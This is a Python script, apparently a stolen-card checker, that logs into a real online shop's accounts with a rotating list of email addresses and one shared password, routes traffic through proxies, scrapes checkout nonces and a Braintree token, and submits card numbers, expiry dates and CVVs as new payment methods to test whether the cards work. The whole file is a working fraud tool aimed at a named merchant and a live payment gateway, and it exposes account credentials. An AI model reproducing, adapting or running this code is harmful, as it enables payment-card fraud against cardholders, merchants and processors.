import requests,base64,uuid,secrets
from proxy import proxies

def getstr(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

current_index = 0
def login_user():

    global current_index
    users = ['j.err.yt.us.eb.b.a@gmail.com','serooo63','d.ri.x.d.os.jk@googlemail.com',
             'g.ia.n.cb.rown1.47@googlemail.com','al.t.he.aqui.ri.no.7@gmail.com','combtmp+t4ve5@gmail.com',
             'o.l.ivea.g.ui.lar.412@gmail.com', 'anacs71@7752050.ru','nneves@cwrotzxks.com',
             'pessegdavid@fdeservices.com','ztoc@reviewfood.vn','afalls@doneemail.com','ladymisha2012@bosakun.com',
             'mikejrt@magma-it.nl','juvijuv@cwrotzxks.com','spinn985@starsect.net','wubawubalol@btcmod.com',
             'karinkabataeva@twitterhai.top','andreixav@bitmonkey.xyz','potsnow@fbclone.com','albibeno@schule-breklum.de',
             'canzonealitalia@speeddataanalytics.com','alkristinaa@setxko.com','javiercc1502@adayroi.site','chanho91@likevip.net',
             'jreducation@dealyaari.com']
    
    username = users[current_index]
    
    current_index = (current_index + 1) % len(users)
    
    return username

async def B3_Auth1(cc,mm,yy,cvv):
    user = login_user()
    proxy = proxies()
    r = requests.session()
    r.proxies = proxy
    device_session_id = str(uuid.uuid4()).replace('-', '')
    correction_token = secrets.token_hex(16)
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}
    try:
        response =  r.get('https://www.gikacoustics.com/my-account/', headers=headers)
        login = getstr(response.text, 'woocommerce-login-nonce" value="', '"')
    except:
        return 'Error: Failed to retrieve login nonce'
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.gikacoustics.com',
            'priority': 'u=0, i',
            'referer': 'https://www.gikacoustics.com/my-account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    data = {
        'username': user,
        'password': 'Ayanpro@087',
        'woocommerce-login-nonce': login,
        '_wp_http_referer': '/my-account/',
        'login': 'Log in'
        }

    response =  r.post('https://www.gikacoustics.com/my-account/', headers=headers, data=data)

    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }
    try:
        response =  r.get('https://www.gikacoustics.com/my-account/add-payment-method/', headers=headers)

        add_payment_nonce = getstr(response.text, 'woocommerce-add-payment-method-nonce" value="', '"')
        client_token = getstr(response.text, 'wc_braintree_client_token = ["', '"]')
        dec = base64.b64decode(client_token).decode('utf-8')
        at = getstr(dec, '"authorizationFingerprint":"', '"')
    except Exception as e:
        return 'Error: Bearer token retrieval failed'

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {at}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    json_data = {
        'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
        },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': 'New York',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
    try:
            response =  r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            token = response.json()['data']['tokenizeCreditCard']['token']
    except:
            return 'Error: Failed to tokenize credit card'
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.gikacoustics.com',
            'priority': 'u=0, i',
            'referer': 'https://www.gikacoustics.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"device_session_id":"'+device_session_id+'","fraud_merchant_id":null,"correlation_id":"'+correction_token+'"}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/s8m9jhx2v2fbd5qy/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/s8m9jhx2v2fbd5qy"},"merchantId":"s8m9jhx2v2fbd5qy","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"s8m9jhx2v2fbd5qy","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"GIK Acoustics, LLC","clientId":"Ac0Y7KxZN8wTAH7SDunGOLAf9VGWqCS_pJpc5gXQmKyynTgGPArnVx5yEi0XD7ztTP9BKmU0pEGWbMl-","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"gikacousticsllc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
            'woocommerce-add-payment-method-nonce': add_payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

    response =  r.post(
            'https://www.gikacoustics.com/my-account/add-payment-method/',
            headers=headers,
            data=data,
        )
    try:
        error_msg = getstr(response.text, 'Reason: ', '		</div>')
        if error_msg:
            return error_msg
        else:
            if 'Payment method successfully added.' in response.text:
                return 'Payment method successfully added.'
            else:
                return 'Payment method addition failed.'
    except:
        return 'Unknown error occurred.'
            